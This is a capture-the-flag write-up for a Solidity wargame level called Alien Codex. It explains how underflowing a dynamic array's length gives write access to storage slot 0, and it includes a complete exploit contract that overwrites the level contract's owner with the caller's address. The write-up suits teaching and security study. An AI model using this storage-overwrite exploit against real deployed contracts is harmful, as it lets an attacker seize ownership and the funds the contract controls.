#ALIEN CODEX

##Objective:
to become the owner of the contract. 

##solution : 
the level is about dynamic arrays in solidity.

Call the make_contact() function so that the contact is set to true.
Call the retract() function. This will decrease the codex.length by 1
this creates an underflow as 1 is being subtracted from zero.
which changes the codex.length to be 2^256.

call the revise() function to access the array at slot 0

##exploit: 
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract AlienHack {
    AlienCodex level19 = AlienCodex(<addr>);

    function exploit () external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        level19.make_contact();
        level19.retract();
        level19.revise(index, myAddress);
    }
}
```
